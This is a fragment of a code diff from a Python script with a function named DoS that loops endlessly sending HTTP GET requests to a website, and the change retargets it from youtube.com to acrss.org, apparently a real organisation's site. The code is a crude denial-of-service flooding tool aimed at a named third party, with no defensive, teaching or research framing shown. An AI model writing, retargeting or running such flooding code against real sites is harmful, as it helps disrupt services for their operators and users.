@@ -4,7 +4,7 @@ import threading
 def DoS():
     x = 1
     while True:
-        print(requests.get('https://www.youtube.com/'))
+        print(requests.get('https://www.acrss.org/'))
         print(x)
         x += 1
 
